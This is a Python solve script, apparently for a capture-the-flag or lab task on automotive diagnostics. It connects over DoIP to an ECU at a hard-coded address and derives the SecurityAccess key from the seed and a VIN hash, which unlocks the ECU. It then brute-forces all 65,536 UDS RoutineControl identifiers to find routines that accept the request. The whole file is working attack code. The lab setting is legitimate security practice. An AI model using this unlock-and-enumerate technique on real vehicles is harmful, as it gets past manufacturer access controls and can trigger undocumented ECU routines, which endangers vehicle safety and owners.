import sys, json, hashlib, struct, socket, time
sys.path.insert(0,"04_SOLVE/uds")
from solve_task04 import hash8, C_DEV
H=lambda t,p: bytes([0x02,0xFD])+struct.pack(">H",t)+struct.pack(">I",len(p))+p
HOST,PORT="10.226.193.2",13400; SA=0x0E00; TA=0xE442
T=json.load(open("work/t5/ticket.json"))["diagnosticTicket"]
VIN=b"CV622697F82A936A1"

def rp(s):
    hdr=b""
    while len(hdr)<8:
        c=s.recv(8-len(hdr))
        if not c: return None
        hdr+=c
    v,i,pt,ln=struct.unpack(">BBHI",hdr); pl=b""
    while len(pl)<ln:
        c=s.recv(ln-len(pl))
        if not c: break
        pl+=c
    return pt,pl

s=socket.socket(); s.settimeout(4); s.connect((HOST,PORT))
s.sendall(H(0x0005,struct.pack(">H",SA)+b"\x00"+b"\x00"*4)); rp(s)
def diag(payload):
    s.sendall(H(0x8001,struct.pack(">H",SA)+struct.pack(">H",TA)+payload))
    r=rp(s)
    return r[1][4:].hex() if r and r[0]==0x8001 and len(r[1])>=5 else ""
print("1003:",diag(bytes.fromhex("1003")))
print("bind:",diag(bytes.fromhex("2EF1A1")+T.encode()))
sd=diag(bytes.fromhex("2701")); seed=bytes.fromhex(sd[4:])
key=hash8(seed, hashlib.sha256(VIN).digest()[:8], C_DEV)
print("unlock:",diag(bytes.fromhex("2702")+key))

hits=[]; t0=time.time()
for lo in range(0x0000,0x10000,48):
    chunk=list(range(lo,min(lo+48,0x10000)))
    blob=b"".join(H(0x8001,struct.pack(">H",SA)+struct.pack(">H",TA)+
                    bytes([0x31,0x01])+struct.pack(">H",r)) for r in chunk)
    s.sendall(blob); s.settimeout(1.2)
    n=0
    while n<len(chunk):
        r=rp(s)
        if r is None: break
        pt,pl=r
        if pt!=0x8001 or len(pl)<5: continue
        uds=pl[4:].hex()
        if not uds.startswith("7f3131"):
            hits.append((chunk[n],uds)); print(f"  *** 31 01 {chunk[n]:#06x} -> {uds}",flush=True)
        n+=1
    if lo%8192<48: print(f"  ...{lo:#06x} ({time.time()-t0:.0f}s) hits={len(hits)}",flush=True)
s.close()
print(f"DONE hits={len(hits)} elapsed={time.time()-t0:.0f}s")
print(hits)
